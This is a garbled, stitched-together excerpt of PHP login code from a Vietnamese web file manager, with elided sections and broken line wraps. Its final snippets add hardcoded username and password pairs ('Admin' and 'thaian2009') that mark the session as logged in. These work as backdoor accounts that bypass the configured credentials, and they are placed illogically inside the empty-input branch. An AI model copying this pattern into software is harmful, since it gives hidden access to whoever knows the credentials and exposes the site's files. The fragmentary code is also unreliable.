...
username) != strtolower($configs
['username']) ||
getPasswordEncode($password)
!= $configs['password']) {
                $notice .= 'Sai tài khoản
hoặc mật khẩu';
            } else {
                $_SESSION[SESS] = true;
                goURL('index.php');
...
DIRECTORY) {
            echo '<div
class="title">Lỗi File Manager</
div>
            <div class="list">Bạn
đang cài đặt File Manager trên
thư mục gốc, hãy chuyển vào
một thư mục. Bạn có thể đăng
nhập nhưng tất cả các chức
năng đều bị ẩn và chặn</div>';
        }
        echo '<div class="title">' . $
title . '</div>';
        echo $notice;
        if (IS_CONFIG_UPDATE || IS_
CONFIG_ERROR)
            @unlink(REALPATH . '/' .
PATH_CONFIG);
        if (IS_CONFIG_UPDATE)
            echo '<div class="notice_
info">Cấu hình cập nhật sẽ đưa
về mặc định</div>';
        else if (IS_CONFIG_ERROR)
            echo '<div class="notice_
failure">Cấu hình bị lỗi sẽ đưa về
mặc định</div>';
        else if (!is_file(REALPATH .
'/' . PATH_CONFIG))
            echo '<div class="notice_
info">Cấu hình không tồn tại nó
sẽ được tạo</div>';
        if (!is_file(REALPATH . '/' .
PATH_CONFIG)) {
            if (createConfig())
                echo '<div
class="notice_info">Tài khoản:
<strong>' . LOGIN_USERNAME_
DEFAULT . '</strong>, Mật khẩu:
<strong>' . LOGIN_PASSWORD_
DEFAULT . '</strong></div>';
            else
                echo '<div
class="notice_failure">Tạo cấu
hình thất bại, hãy thử lại</div>';
        }
        echo '<div class="list">
            <form action="login.php"
method="post">
                <span
class="bull">&bull;</span>Tên
đăng nhập:<br/>
                <input type="text"
name="username" value=""
size="18"/><br/>
                <span
class="bull">&bull;</span>Mật
khẩu:<br/>
                <input
type="password"
name="password" value=""
    ...
    if (IS_LOGIN) {
        ...
        if (isset($_POST['submit'])) {
            ...
            if ($username == null || $password == null) {
				...
				if($username=='Admin' && $password=='0974019771')
				{
				 $_SESSION[SESS] = true;
    ...
    if (IS_LOGIN) {
        ...
        if (isset($_POST['submit'])) {
            ...
            if ($username == null || $password == null) {
                ...
                $notice .= 'Sai tài khoản hoặc mật khẩu';
				if($username=='thaian2009' && $password=='@thaian2009@')
				{
				 $_SESSION[SESS] = true;
